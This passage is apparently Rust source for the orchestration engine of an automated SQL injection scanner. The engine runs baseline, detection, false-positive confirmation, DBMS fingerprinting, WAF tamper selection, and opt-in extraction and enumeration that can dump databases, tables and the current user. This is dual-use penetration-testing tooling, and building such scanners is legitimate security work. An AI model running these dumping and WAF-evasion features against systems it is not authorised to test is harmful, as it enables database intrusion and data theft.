#![deny(unsafe_code)]

pub use crate::target::injection::{
    APP_FILTER_STATUS, FILTER_STREAK_LIMIT, ProbeOpts, baseline_all_error,
    build_injection_spec_with_raw, filter_params, headers_preserving_raw,
    headers_preserving_raw_keep_ct, inject_body_param, inject_multipart_field, inject_param,
    inject_param_or_marker, inject_with_marker, is_app_filter_block, is_ignored, payload_budget,
    request_spec_from_raw, resolve_effective_tampers, synthetic_raw_from_data, waf_auto_tampers,
};
use crate::{
    dbms::context::{DbmsBelief, InjectionContext},
    detection::{baseline, scanner::scheduler::ensure_union_starvation_guard},
    error::InjektError,
    http::client::{HttpClient, RequestSpec},
    http::timeouts::RequestClass,
    reasoning::Hypothesis,
    reporting::verdict::severity_for,
    session::{
        scrubber::Scrubber,
        state::{Finding, SessionState, Severity, TechniqueKind},
    },
    target::{
        markers::MarkerSet,
        parameters::{ParameterLocation, TargetParameter},
        raw_request::RawRequest,
        url::TargetUrl,
    },
    techniques::{
        boolean::detector::BooleanDetector,
        payload_opts::{PayloadOpts, build_final_payload_with_rng},
        tamper::Tamper,
    },
};
use futures::StreamExt as _;
use indicatif::{ProgressBar, ProgressStyle};
use std::{collections::HashMap, io::IsTerminal as _, sync::Arc, time::Instant};
use tokio::sync::RwLock;
use tokio_util::sync::CancellationToken;
use tracing::{debug, info, warn};

/// Spinner hidden when stderr is not a TTY (MCP stdio, pipes, CI).
/// `indicatif` writes to stderr, so stdout JSON-RPC stays clean, but hidden
/// avoids spam + steady-tick CPU in agent mode.
fn spinner(msg: &str) -> ProgressBar {
    if !std::io::stderr().is_terminal() {
        return ProgressBar::hidden();
    }
    let pb = ProgressBar::new_spinner();
    pb.set_style(
        ProgressStyle::default_spinner()
            .template("{spinner} {msg}")
            .unwrap_or_else(|_| ProgressStyle::default_spinner()),
    );
    pb.set_message(msg.to_owned());
    pb.enable_steady_tick(std::time::Duration::from_millis(80));
    pb
}

fn progress_bar(len: u64) -> ProgressBar {
    if !std::io::stderr().is_terminal() {
        return ProgressBar::hidden();
    }
    let pb = ProgressBar::new(len);
    pb.set_style(
        ProgressStyle::default_bar()
            .template("{bar:40} {pos}/{len} {msg}")
            .unwrap_or_else(|_| ProgressStyle::default_bar()),
    );
    pb
}

/// `check_deadline` moved to `super::schedule` (P1).

#[derive(Debug, Clone, PartialEq, Eq)]
#[non_exhaustive]
pub enum EngineState {
    Parse,
    Baseline,
    Context,
    Detection,
    Fingerprint,
    Extraction,
    Enumeration,
    Done,
    /// Run stopped before completion (Ctrl+C, empty baseline after cancel).
    /// Never map to `CLEAN`: the target was not fully tested.
    Cancelled,
    /// Run finished without findings but the oracle was unusable or the
    /// budget was exhausted (unstable baseline, all-5xx baseline,
    /// `--request-budget` / `--max-duration` stop). Never map to `CLEAN`.
    Inconclusive,
}

/// Engine configuration structs live in `super::config` (P1).
/// Re-exported here (and via `crate::engine`) for backward compatibility.
pub use super::config::{
    BudgetConfig, EngineConfig, EnumConfig, EvasionConfig, MAX_DETECTION_DURATION_SECS_CAP,
    NetConfig, OobConfig, SecondOrderConfig,
};

#[derive(Debug)]
#[non_exhaustive]
pub struct Engine {
    config: EngineConfig,
    client: HttpClient,
    state: Arc<RwLock<SessionState>>,
    cancel: CancellationToken,
    scrubber: Scrubber,
    baseline_cache: Option<Arc<crate::recon::BaselineCache>>,
    /// `true` when `client` is shared across concurrent engines (recon
    /// scan): per-engine drains would race (`swap(0)` attributed to the
    /// first finisher), so absorbs are skipped and the owner drains once
    /// at the end of the whole run.
    shared_client: bool,
}

/// Outcome of one concurrent baseline fetch (Phase 3, `join_all` borné).
/// `BodyReadFailed` (compté, retry) vs `TransportFailed` (non compté, retry)
/// préserve la comptabilité historique ; `Cancelled` sort proprement.
enum BaselineOutcome {
    Sample(baseline::Sample),
    BodyReadFailed,
    TransportFailed(String),
    Cancelled,
}

/// Scope of the confirm second-pass (anti-FP P2.4).
///
/// `--confirm` selects [`ConfirmScope::All`] (historical behaviour,
/// C5-tardif mini-mutation included); a default run uses
/// [`ConfirmScope::MediumRisk`], so confirmed findings below the `High`
/// bucket are re-validated for free (0 request when no candidate exists).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ConfirmScope {
    /// Every confirmed non-OOB finding (`--confirm`).
    All,
    /// Confirmed non-OOB findings below the `High` bucket (default).
    MediumRisk,
}

/// `true` when a finding must be re-validated by the automatic second-pass
/// (no `--confirm`): confirmed, non-OOB, not calibrated `High`, on any
/// technique whose second-pass re-probes the same channel/variant window as
/// first-pass detection.
///
/// `High` findings (score + FP estimate both agree) already meet the ≥95 %
/// precision claim; re-probing them would only add traffic. `Medium`/`Low`
/// findings carry the residual FP risk, so they are re-validated — the pass
/// never creates findings and inconclusive outcomes keep them (fail-open).
///
/// Every non-OOB technique now has first-pass window parity: `Time` re-sweeps
/// the same payload family/budget (blind sweep included), `Json` replays the
/// GraphQL `variables` envelope, `Json`/`Nosql` re-probe the finding's
/// original channel (`channel=error` → error probe) and `Nosql` keeps the
/// JSON-body operator shape — so a failed re-confirmation is conclusive and
/// auto-dropping no longer risks losing true positives.
fn needs_auto_second_pass(f: &Finding) -> bool {
    f.technique != TechniqueKind::Oob
        && is_confirmed_finding(f)
        && severity_for(f.confidence, f.false_positive_prob) != Severity::High
}

/// `true` when `f` falls in the given second-pass [`ConfirmScope`]: `All`
/// keeps the historical filter (every confirmed non-OOB finding),
/// `MediumRisk` is the strict automatic subset ([`needs_auto_second_pass`]).
fn in_confirm_scope(f: &Finding, scope: ConfirmScope) -> bool {
    match scope {
        ConfirmScope::All => f.technique != TechniqueKind::Oob && is_confirmed_finding(f),
        ConfirmScope::MediumRisk => needs_auto_second_pass(f),
    }
}

impl Engine {
    #[must_use]
    pub fn new(config: EngineConfig, client: HttpClient, cancel: CancellationToken) -> Self {
        let scrubber = Scrubber::new(config.no_redact);
        let mut initial = SessionState::new();
        initial.set_seed(config.seed);
        Self {
            config,
            client,
            state: Arc::new(RwLock::new(initial)),
            cancel,
            scrubber,
            baseline_cache: None,
            shared_client: false,
        }
    }

    /// Share ownership of `client` across concurrent engines (recon scan):
    /// per-engine detectability drains are skipped (they would race) and
    /// the caller drains once at the end via
    /// [`HttpClient::take_detectability_counts`].
    #[must_use]
    pub fn with_shared_client(mut self) -> Self {
        self.shared_client = true;
        self
    }

    #[must_use]
    pub fn with_baseline_cache(mut self, cache: Arc<crate::recon::BaselineCache>) -> Self {
        self.baseline_cache = Some(cache);
        self
    }

    #[must_use]
    pub fn state_handle(&self) -> Arc<RwLock<SessionState>> {
        Arc::clone(&self.state)
    }

    /// # Errors
    /// Returns an error if the target URL fails to parse, or a network/detection
    /// phase fails unrecoverably.
    pub async fn run(&self, target_str: &str) -> crate::error::Result<EngineState> {
        self.run_internal(target_str, None).await
    }

    /// # Errors
    /// Returns an error if the candidate URL fails to parse, or a network/detection
    /// phase fails unrecoverably.
    pub async fn run_candidate(
        &self,
        candidate: &crate::recon::ParameterCandidate,
    ) -> crate::error::Result<EngineState> {
        self.run_internal(candidate.url.as_str(), Some(candidate))
            .await
    }

    #[allow(clippy::too_many_lines)]
    async fn run_internal(
        &self,
        target_str: &str,
        candidate: Option<&crate::recon::ParameterCandidate>,
    ) -> crate::error::Result<EngineState> {
        let mut current = EngineState::Parse;
        let run_started = Instant::now();
        info!(target=%self.scrubber.scrub(target_str), state=?current, "engine start");

        // `--confirm` strict second-pass (C6): re-sonde every confirmed finding
        // with fresh payloads + derived seed after detection (OOB excluded).
        // In-detection 3-trial confirmation still applies regardless.
        if self.config.confirm {
            info!("--confirm second-pass enabled (fresh payloads, derived seed, OOB excluded)");
        }

        // Parse (lexical) + DNS-time SSRF check (anti DNS-rebinding).
        // Skipped when the proxy does remote DNS (`socks5h://`): a local
        // `lookup_host` would leak the hostname and fail `.onion` names the
        // proxy could resolve. Lexical + IP-literal checks in `parse` still apply.
        let target = TargetUrl::parse(target_str, self.config.net.allow_private)
            .map_err(|e| crate::error::InjektError::Other(Box::new(e)))?;
        if !self.config.net.allow_private
            && !self.config.net.remote_dns
            && let Some(host) = target.inner().host_str()
        {
            TargetUrl::resolve_and_check(host, false)
                .await
                .map_err(|e| crate::error::InjektError::Other(Box::new(e)))?;
        }
        current = EngineState::Baseline;
        info!(
            target=%self.scrubber.scrub(target_str),
            state=?current,
            "phase baseline"
        );

        if self.cancel.is_cancelled() {
            self.absorb_detectability().await;
            return Ok(EngineState::Cancelled);
        }
        // Budget spent before baseline: skip the 3-sample sequence entirely
        // (cooperative plafond, same as fingerprint/extraction guards below).
        // Mid-baseline overshoot (≤3 concurrent samples) stays within the
        // documented one-technique tolerance.
        if BudgetConfig::is_over_request_budget(
            self.state.read().await.request_count(),
            self.config.budget.request_budget,
        ) {
            warn!("request-budget spent, skipping baseline");
            self.absorb_detectability().await;
            return Ok(EngineState::Inconclusive);
        }

        let candidate_param = candidate.map(crate::recon::ParameterCandidate::target_parameter);
        let raw_request = self.build_raw_request(candidate);

        let Some((baseline, effective_tampers, effective_opts)) =
            self.collect_baseline(&target, raw_request.as_ref()).await?
        else {
            self.absorb_detectability().await;
            return Ok(EngineState::Cancelled);
        };

        // A changing baseline is not a usable oracle: any later TRUE/FALSE
        // differential could simply be application noise.  Stop before
        // context and detection probes so an unstable endpoint is reported as
        // inconclusive instead of producing misleading findings.
        if !baseline.is_stable() {
            warn!(
                target=%self.scrubber.scrub(target_str),
                statuses=?baseline.status_codes,
                "baseline unstable — skipping injection detection"
            );
            self.absorb_detectability().await;
            return Ok(EngineState::Inconclusive);
        }
        // All-5xx baseline: every differential below compares static error
        // pages, so the run is void by construction. Remember it for the
        // final verdict (INCONCLUSIVE, never CLEAN) while still letting
        // detection run for transient-blip tolerance.
        let baseline_unreachable = baseline_all_error(&baseline.status_codes);
        if baseline_unreachable {
            warn!(
                target=%self.scrubber.scrub(target_str),
                statuses=?baseline.status_codes,
                "baseline: all samples server-error (5xx) — origin unreachable, detection differentials will be meaningless"
            );
        }

        current = EngineState::Context;
        info!(
            target=%self.scrubber.scrub(target_str),
            state=?current,
            "phase context"
        );

        let (marker_set, to_test) = self.select_params(
            target_str,
            &target,
            raw_request.as_ref(),
            candidate_param.as_ref(),
        );
        let raw_request = Arc::new(raw_request);

        // Run adaptive context analysis (<=8 requests bound, 0 DBMS probes if --dbms)
        let context_started = Instant::now();
        let context_req_before = self.state.read().await.request_count();
        let primary_param = to_test.first();
        let context_result = if let Some(param) = primary_param {
            crate::dbms::context::analyze_context(
                &self.client,
                &self.state,
                &self.cancel,
                &target,
                param,
                raw_request.as_ref().as_ref(),
                &baseline,
                self.config.dbms_hint.as_deref(),
            )
            .await
        } else {
            crate::dbms::context::ContextProbeResult {
                context: crate::dbms::context::InjectionContext::new(),
                dbms_belief: self.config.dbms_hint.as_deref().map_or_else(
                    crate::dbms::context::DbmsBelief::uniform,
                    crate::dbms::context::DbmsBelief::from_hint,
                ),
                probes_sent: 0,
                error_evidence: None,
            }
        };

        let context_elapsed = context_started.elapsed().as_secs_f64();
        let context_req_delta = self
            .state
            .read()
            .await
            .request_count()
            .saturating_sub(context_req_before);
        info!(
            target=%self.scrubber.scrub(target_str),
            context=%context_result.context.summary(),
            probes=context_result.probes_sent,
            elapsed_s=context_elapsed,
            requests=context_req_delta,
            "context done in {context_elapsed:.1}s ({context_req_delta} req) — {}",
            context_result.context.summary(),
        );

        let (top_dbms, prob) = context_result.dbms_belief.top_candidate();
        if prob >= 0.85 && top_dbms != crate::dbms::common::DbmsKind::Unknown {
            self.state.write().await.fill_missing_dbms(top_dbms);
            info!(%top_dbms, confidence=%prob, "DBMS identified early during context analysis");
        }

        current = EngineState::Detection;
        info!(
            target=%self.scrubber.scrub(target_str),
            state=?current,
            "phase detection"
        );

        let detection_started = Instant::now();
        let detection_req_before = self.state.read().await.request_count();
        // Clone borné pour Option B second-order (Body/Query, ≤max_stores) :
        // `run_detection` consomme `to_test`, le clone préserve la liste
        // filtrée `-p` pour `run_second_order` sans refaire `select_params`.
        let to_test_for_second_order = to_test.clone();
        self.run_detection(
            &target,
            target_str,
            &marker_set,
            &raw_request,
            &baseline,
            &effective_tampers,
            &context_result.context,
            &context_result.dbms_belief,
            context_result.probes_sent,
            to_test,
        )
        .await;
        {
            let detection_elapsed = detection_started.elapsed().as_secs_f64();
            let detection_req_delta = self
                .state
                .read()
                .await
                .request_count()
                .saturating_sub(detection_req_before);
            let detection_findings = self.state.read().await.findings().len();
            info!(
                elapsed_s = detection_elapsed,
                requests = detection_req_delta,
                findings = detection_findings,
                "detection done in {detection_elapsed:.1}s ({detection_req_delta} req, {detection_findings} findings)"
            );
        }

        // C6 strict second-pass (anti-FP P2.4): `--confirm` re-probes every
        // confirmed non-OOB finding with fresh payloads + derived seed
        // (historical behaviour, ~2x req documented); without the flag, the
        // same pass re-validates confirmed non-High findings on every
        // non-OOB technique (bounded auto anti-FP with first-pass window
        // parity — see `needs_auto_second_pass`). Never creates new
        // findings — only drops those that fail re-validation (0 new FP on
        // N1/N2 by construction).
        let confirm_scope = if self.config.confirm {
            ConfirmScope::All
        } else {
            ConfirmScope::MediumRisk
        };
        self.run_confirm_second_pass(
            &target,
            target_str,
            &marker_set,
            &raw_request,
            &baseline,
            &effective_tampers,
            effective_opts,
            &context_result.context,
            &context_result.dbms_belief,
            detection_started,
            confirm_scope,
        )
        .await;

        // Option B second-order actif borné (lab only, même-origine) :
        // APRÈS `run_confirm_second_pass`, AVANT `run_fingerprint`.
        // OFF par défaut = 0 requête extra (chemin byte-identique).
        if self.config.second_order.enabled {
            self.run_second_order(
                &target,
                target_str,
                &to_test_for_second_order,
                &marker_set,
                &raw_request,
                &baseline,
            )
            .await?;
        }

        // `--explain <param>`: one-line reasoning verdict after the run.
        if let Some(wanted) = self.config.explain.clone() {
            let st = self.state.read().await;
            if let Some(line) = st.explain(&wanted) {
                info!(param=%wanted, explain=%line, "--explain");
            } else {
                warn!(param=%wanted, "no finding matches --explain");
            }
        }

        current = EngineState::Fingerprint;
        info!(
            target=%self.scrubber.scrub(target_str),
            state=?current,
            "phase fingerprint"
        );
        let fingerprint_started = Instant::now();
        let fingerprint_req_before = self.state.read().await.request_count();
        self.run_fingerprint(
            &target,
            target_str,
            &marker_set,
            &raw_request,
            &baseline,
            &effective_tampers,
            effective_opts,
            &self.config.matcher,
        )
        .await;
        {
            let fingerprint_elapsed = fingerprint_started.elapsed().as_secs_f64();
            let fingerprint_req_delta = self
                .state
                .read()
                .await
                .request_count()
                .saturating_sub(fingerprint_req_before);
            if fingerprint_req_delta == 0 {
                info!("fingerprint skipped (no confirmed findings, 0 req)");
            } else {
                info!(
                    elapsed_s = fingerprint_elapsed,
                    requests = fingerprint_req_delta,
                    "fingerprint done in {fingerprint_elapsed:.1}s ({fingerprint_req_delta} req)"
                );
            }
        }

        if self.config.enumeration.extract {
            // Gate early (same rule as enumeration): no finding => no oracle.
            // Prevents hundreds of blind requests on a clean target, in
            // particular with `--auto-enumerate`.
            let snap = self.state.read().await.findings().to_vec();
            if snap.is_empty() {
                warn!(
                    target=%self.scrubber.scrub(target_str),
                    "--extract requested but no confirmed vulnerability was found — skipping"
                );
            } else if !is_extraction_eligible(&snap) {
                warn!(
                    target=%self.scrubber.scrub(target_str),
                    "likely FP, extraction skipped (no boolean-confirmed or error-with-fragment finding)"
                );
            } else {
                current = EngineState::Extraction;
                info!(
                    target=%self.scrubber.scrub(target_str),
                    state=?current,
                    "phase extraction — inference (opt-in)"
                );
                self.run_extraction(
                    &target,
                    target_str,
                    &marker_set,
                    &raw_request,
                    &baseline,
                    &effective_tampers,
                    effective_opts,
                )
                .await?;
            }
        }

        // Enumeration phase (--dbs, --tables, --columns, --dump, --count,
        // --banner, --current-user, --current-db, --hostname). Requires a
        // *boolean-capable* finding (same bar as extraction): the enumerator
        // runs a boolean-differential oracle, so stacked/time/union-only
        // snapshots would chase noise into `inference inconsistency` errors
        // after burning a full oracle pass per candidate.
        let needs_enum = self.config.enumeration.dbs
            || self.config.enumeration.tables
            || self.config.enumeration.columns
            || self.config.enumeration.dump
            || self.config.enumeration.count
            || self.config.enumeration.banner
            || self.config.enumeration.current_user
            || self.config.enumeration.current_db
            || self.config.enumeration.hostname;
        let snap_for_enum = self.state.read().await.findings().to_vec();
        let enum_eligible = is_extraction_eligible(&snap_for_enum);
        if needs_enum && enum_eligible {
            current = EngineState::Enumeration;
            info!(
                target=%self.scrubber.scrub(target_str),
                state=?current,
                "phase enumeration — dbs/tables/columns/dump"
            );
            self.run_enumeration(
                &target,
                target_str,
                &marker_set,
                &raw_request,
                &baseline,
                &effective_tampers,
                effective_opts,
            )
            .await?;
        } else if needs_enum && snap_for_enum.is_empty() {
            warn!(
                target=%self.scrubber.scrub(target_str),
                "enumeration requested but no confirmed vulnerability was found"
            );
        } else if needs_enum {
            warn!(
                target=%self.scrubber.scrub(target_str),
                "likely FP, enumeration skipped (no boolean-capable finding: stacked/time-only cannot feed the oracle)"
            );
        }

        current = EngineState::Done;
        // C10: absorb every throttled hop (403/429, incl. retried 429s) into
        // the run's detectability counters before reporting.
        self.absorb_detectability().await;
        let requests = self.state.read().await.request_count();
        let detectability = self.state.read().await.detectability();
        let findings_snapshot = self.state.read().await.findings().to_vec();
        // Incomplete runs must never look CLEAN: budget/duration stops,
        // cancel, or an unusable (all-5xx) baseline degrade Done to
        // Inconclusive/Cancelled when no finding was produced. Findings still
        // surface as FINDINGS upstream (a hit is a hit, even on a truncated
        // run); only the 0-finding case changes verdict.
        if findings_snapshot.is_empty() {
            if self.cancel.is_cancelled() {
                current = EngineState::Cancelled;
            } else if baseline_unreachable
                || BudgetConfig::is_over_request_budget(requests, self.config.budget.request_budget)
                || BudgetConfig::is_over_max_duration(
                    detection_started,
                    self.config.budget.max_duration_secs,
                )
            {
                current = EngineState::Inconclusive;
            }
        } else if self.cancel.is_cancelled() {
            current = EngineState::Cancelled;
        }
        let total_elapsed = run_started.elapsed().as_secs_f64();
        // Findings per technique for the one-line summary (e.g. `boolean×1,
        // error×1`). Sorted for deterministic output.
        let mut by_technique: HashMap<String, usize> = HashMap::new();
        for finding in &findings_snapshot {
            *by_technique
                .entry(finding.technique.to_string())
                .or_insert(0) += 1;
        }
        let mut technique_parts: Vec<String> = by_technique
            .iter()
            .map(|(tech, count)| format!("{tech}×{count}"))
            .collect();
        technique_parts.sort();
        let findings_detail = if technique_parts.is_empty() {
            "no findings".to_owned()
        } else {
            format!(
                "{} finding(s) ({})",
                findings_snapshot.len(),
                technique_parts.join(", ")
            )
        };
        if findings_snapshot.is_empty() {
            info!(
                target=%self.scrubber.scrub(target_str),
                state=?current,
                requests,
                findings = 0,
                elapsed_s = total_elapsed,
                count_403 = detectability.count_403,
                count_429 = detectability.count_429,
                "scan done: {findings_detail}, {requests} req in {total_elapsed:.1}s (403×{} 429×{})",
                detectability.count_403,
                detectability.count_429,
            );
        } else {
            info!(
                target=%self.scrubber.scrub(target_str),
                state=?current,
                requests,
                findings = findings_snapshot.len(),
                elapsed_s = total_elapsed,
                count_403 = detectability.count_403,
                count_429 = detectability.count_429,
                "scan done: {findings_detail}, {requests} req in {total_elapsed:.1}s (403×{} 429×{}) — try --explain <param> for reasoning",
                detectability.count_403,
                detectability.count_429,
            );
        }
        Ok(current)
    }

    /// Drain the [`HttpClient`] throttle counters into the run's
    /// detectability counters (C10, bench Annexe A). Take-semantics: each run
    /// is absorbed exactly once, even if the client is reused across runs.
    /// Skipped when the client is shared across concurrent engines
    /// ([`Engine::with_shared_client`]): the `swap(0)` would be attributed
    /// to whichever engine finishes first, so the owner drains once at the
    /// end of the whole run instead.
    async fn absorb_detectability(&self) {
        if self.shared_client {
            return;
        }
        let (c403, c429) = self.client.take_detectability_counts();
        if c403 != 0 || c429 != 0 {
            self.state.write().await.add_detectability(c403, c429);
        }
    }

    /// Fused raw request: `EngineConfig::raw_request` (`--raw-file` + CLI
    /// overlays) wins, then the recon-candidate synthetic, then `--data`.
    /// A bare `--method` without any body is carried as a method-only raw so
    /// baseline + injection preserve it instead of falling back to `GET`.
    fn build_raw_request(
        &self,
        candidate: Option<&crate::recon::ParameterCandidate>,
    ) -> Option<RawRequest> {
        if let Some(mut raw) = self.config.raw_request.clone() {
            if let Some(m) = self.config.net.method_override.as_deref() {
                let m = m.trim();
                if !m.is_empty() {
                    raw.method = m.to_ascii_uppercase();
                }
            }
            return Some(raw);
        }
        let cli_raw_request = candidate.map(crate::recon::ParameterCandidate::raw_request);
        if let Some(mut raw) = cli_raw_request {
            if let Some(m) = self.config.net.method_override.as_deref() {
                let m = m.trim();
                if !m.is_empty() {
                    raw.method = m.to_ascii_uppercase();
                }
            }
            if self.config.post_data.is_some() {
                warn!("--raw-file and --data both set — raw request wins, --data ignored");
            }
            return Some(raw);
        }
        if let Some(data) = self.config.post_data.as_deref() {
            let raw = synthetic_raw_from_data(data);
            if raw.is_none() && !data.is_empty() {
                warn!("--data is blank — scanning without a body");
            }
            if let Some(mut raw) = raw {
                if let Some(m) = self.config.net.method_override.as_deref() {
                    let m = m.trim();
                    if !m.is_empty() {
                        raw.method = m.to_ascii_uppercase();
                    }
                }
                return Some(raw);
            }
        }
        // Bare `--method` (e.g. `--method POST --target <url>`): method carrier.
        if let Some(m) = self.config.net.method_override.as_deref() {
            let m = m.trim().to_ascii_uppercase();
            if !m.is_empty() {
                return Some(RawRequest {
                    method: m,
                    path: "/".to_owned(),
                    headers: HashMap::new(),
                    body: None,
                    http_version: "HTTP/1.1".to_owned(),
                });
            }
        }
        None
    }

    /// Marker set: `MarkerSet::detect(target)` OR-ed with explicit `--marker`.
    /// Accepts `*`, `§` (or `%c2%a7`), `{{}}` in any combination; unknown
    /// values warn and fall back to detection alone.
    fn effective_marker_set(&self, target_str: &str) -> MarkerSet {
        let mut set = MarkerSet::detect(target_str);
        if let Some(m) = self.config.marker.as_deref() {
            let lower = m.to_ascii_lowercase();
            let mut known = false;
            if m.contains('*') || lower.contains("%2a") {
                set.asterisk = true;
                known = true;
            }
            if m.contains('§') || lower.contains("%c2%a7") {
                set.section = true;
                known = true;
            }
            if m.contains("{{") && m.contains("}}") {
                set.double_brace = true;
                known = true;
            }
            if !known {
                warn!(marker=%m, "unknown --marker, ignoring (expected *, § or {{}})");
            }
        }
        set
    }

    /// Normalized `--dbms` hint as `DbmsKind`, if set and recognized.
    fn dbms_hint_kind(&self) -> Option<crate::dbms::DbmsKind> {
        let hint = self.config.dbms_hint.as_deref()?;
        let v = hint.trim().to_ascii_lowercase();
        match v.as_str() {
            "mysql" | "mariadb" | "my" => Some(crate::dbms::DbmsKind::MySql),
            "postgres" | "postgresql" | "pg" | "pgsql" => Some(crate::dbms::DbmsKind::Postgres),
            "mssql" | "sqlserver" | "sql-server" | "tsql" => Some(crate::dbms::DbmsKind::MsSql),
            "oracle" | "ora" => Some(crate::dbms::DbmsKind::Oracle),
            "sqlite" => Some(crate::dbms::DbmsKind::Sqlite),
            _ => {
                warn!(dbms=%hint, "unknown --dbms hint, ignoring (auto-fingerprint)");
                None
            }
        }
    }

    /// Collects 3 baseline samples, derives the WAF-aware effective tampers/opts.
    /// `Ok(None)` means the run was cancelled with no samples collected — caller
    /// should return [`EngineState::Cancelled`] immediately.
    ///
    /// When a [`crate::recon::BaselineCache`] is attached (recon mode), reuse
    /// the cached entry for `host:port:scheme:raw_hash` instead of re-sending
    /// the 3-sample sequence. WAF-blocking baselines bypass the cache in both
    /// directions (never served, never stored) so a transient block cannot
    /// poison later candidates. Concurrent candidates for the same key
    /// singleflight on a per-key mutex: the first collects, the waiters hit.
    async fn collect_baseline(
        &self,
        target: &TargetUrl,
        raw_request: Option<&RawRequest>,
    ) -> crate::error::Result<Option<(baseline::Baseline, Vec<Tamper>, ProbeOpts)>> {
        let Some(cache) = self.baseline_cache.clone() else {
            return self.collect_baseline_uncached(target, raw_request).await;
        };
        let key = crate::recon::BaselineCache::cache_key(target, raw_request);
        // Singleflight cancellable: `lock_for_key` + per-key mutex sans `select!`
        // bloquaient Ctrl+C jusqu'à la fin du premier collecteur (~90s en recon scan).
        let key_lock = tokio::select! {
            biased;
            () = self.cancel.cancelled() => {
                return Err(crate::error::InjektError::Cancelled);
            }
            lock = cache.lock_for_key(&key) => lock,
        };
        let per_key_guard = tokio::select! {
            biased;
            () = self.cancel.cancelled() => {
                return Err(crate::error::InjektError::Cancelled);
            }
            guard = key_lock.lock() => guard,
        };
        // Blocked in either sense (status-count or marker-signal): never serve
        // from cache, otherwise a transient 403/406/429 poisons later candidates.
        // Conservative: cache bypass on `blocked || blocking` even though
        // `effective_tampers` below additionally requires vendor/marker
        // corroboration for the `blocked` case.
        if let Some((cached_baseline, cached_tampers, cached_opts)) = cache.get(&key).await
            && !(cached_baseline.is_waf_blocked() || cached_baseline.is_waf_blocking())
        {
            let hit = (cached_baseline, cached_tampers, cached_opts);
            drop(per_key_guard);
            cache.remove_lock(&key).await;
            return Ok(Some(hit));
        }
        // Blocking entry (or miss): bypass and re-collect below. The lock is
        // always released, including on probe error (`?`): otherwise the
        // per-key mutex orphans in the map and the singleflight window breaks
        // (redundant baselines + unbounded map growth on bulk runs).
        let collected = match self.collect_baseline_uncached(target, raw_request).await {
            Ok(c) => c,
            Err(e) => {
                drop(per_key_guard);
                cache.remove_lock(&key).await;
                return Err(e);
            }
        };
        if let Some((fresh_baseline, fresh_tampers, fresh_opts)) = collected.as_ref()
            && !(fresh_baseline.is_waf_blocked() || fresh_baseline.is_waf_blocking())
        {
            cache
                .insert(
                    key.clone(),
                    (fresh_baseline.clone(), fresh_tampers.clone(), *fresh_opts),
                )
                .await;
        }
        drop(per_key_guard);
        cache.remove_lock(&key).await;
        Ok(collected)
    }

    /// Uncached baseline collection: 3 samples + WAF-aware tampers/opts.
    ///
    /// Phase 3: les 3 samples sont émis en concurrent (`join_all` borné à 3,
    /// sans `spawn` unbounded) ; `attempts <= 6` borne les envois, seuls les
    /// ratés sont rejoués. Chaque branche vérifie le `CancellationToken`.
    #[allow(clippy::too_many_lines)]
    async fn collect_baseline_uncached(
        &self,
        target: &TargetUrl,
        raw_request: Option<&RawRequest>,
    ) -> crate::error::Result<Option<(baseline::Baseline, Vec<Tamper>, ProbeOpts)>> {
        // Baseline: 3 requests (hidden when stderr is not a TTY: MCP/CI).
        // `indicatif` draws to stderr only, so stdout JSON-RPC stays clean.
        let pb = spinner("collecting baseline…");
        let phase_started = Instant::now();
        let req_before = self.state.read().await.request_count();

        let mut samples = Vec::new();
        // Retry samples on body-read failure instead of pushing `Vec::new()`:
        // an empty body scores as similarity ~0 / confidence 0.75 (false
        // positive). Transport errors (`Timeout`, stream reset) are retryable
        // and must never enter the baseline.
        //
        // Phase 3: the 3 samples are fetched concurrently (`join_all`, borné
        // à 3, sans `spawn` unbounded) so `3×5s` TTFB coûte ~5-6s au lieu de
        // 16s séquentiels. `attempts <= 6` borne le total d'envois
        // individuels ; seuls les samples ratés sont rejoués au tour suivant.
        // Chaque branche vérifie le `CancellationToken` avant envoi (le
        // `send_with_retry` + `read_body` restent annulables via le token).
        // `rate_limit acquire_cancellable` + jitter restent dans
        // `send_with_retry`, donc partagés et bornés comme avant.
        let mut attempts = 0usize;
        while samples.len() < 3 && attempts < 6 {
            if self.cancel.is_cancelled() {
                break;
            }
            let needed =
                (3usize.saturating_sub(samples.len())).min(6usize.saturating_sub(attempts));
            if needed == 0 {
                break;
            }
            attempts = attempts.saturating_add(needed);
            let futs: Vec<_> = (0..needed)
                .map(|_| async {
                    if self.cancel.is_cancelled() {
                        return BaselineOutcome::Cancelled;
                    }
                    let spec = raw_request.map_or_else(
                        || RequestSpec::get(target.as_str().to_owned()),
                        |raw| request_spec_from_raw(target, raw),
                    );
                    // Pure-send timing: `elapsed_send` covers only the last
                    // successful `req.send()` — never local pacing (jitter /
                    // rate-limit / backoff). Pacing-inflated durations widened
                    // `mean/stddev` and desensitized the `time` detector.
                    let timed = self
                        .client
                        .send_with_retry_timed_for_class(spec, RequestClass::Default, &self.cancel)
                        .await;
                    match timed {
                        Ok(t) => {
                            let elapsed = t.elapsed_send;
                            let r = t.resp;
                            let status = r.status().as_u16();
                            // Clone headers BEFORE the body read consumes the response.
                            // Values truncated to 128 chars (OPSEC: bounds Set-Cookie
                            // token retention); WAF detection only needs `contains`.
                            let raw_headers: Vec<(String, String)> = r
                                .headers()
                                .iter()
                                .filter_map(|(name, value)| {
                                    value.to_str().ok().map(|raw| {
                                        let mut kept = raw.to_owned();
                                        if kept.len() > crate::detection::waf::HEADER_VALUE_KEEP {
                                            kept.truncate(crate::detection::waf::HEADER_VALUE_KEEP);
                                        }
                                        (name.as_str().to_ascii_lowercase(), kept)
                                    })
                                })
                                .collect();
                            match tokio::select! {
                                biased;
                                () = self.cancel.cancelled() => None,
                                res = self.client.read_body_with_timeout(r) => Some(res),
                            } {
                                Some(Ok(body)) => BaselineOutcome::Sample(baseline::Sample {
                                    status,
                                    body,
                                    duration: elapsed,
                                    headers: raw_headers,
                                }),
                                Some(Err(_)) => BaselineOutcome::BodyReadFailed,
                                None => BaselineOutcome::Cancelled,
                            }
                        }
                        Err(e) => BaselineOutcome::TransportFailed(format!(
                            "baseline request failed: {e}"
                        )),
                    }
                })
                .collect();
            // Borné à `needed <= 3`, aucun `spawn` (pas de tâche détachée).
            let results = futures::future::join_all(futs).await;
            for outcome in results {
                if self.cancel.is_cancelled() {
                    break;
                }
                match outcome {
                    BaselineOutcome::Sample(s) => {
                        if samples.len() < 3 {
                            samples.push(s);
                            self.state.write().await.increment_requests();
                        }
                    }
                    BaselineOutcome::BodyReadFailed => {
                        warn!("baseline body read failed, retrying sample");
                        self.state.write().await.increment_requests();
                    }
                    BaselineOutcome::Cancelled => {
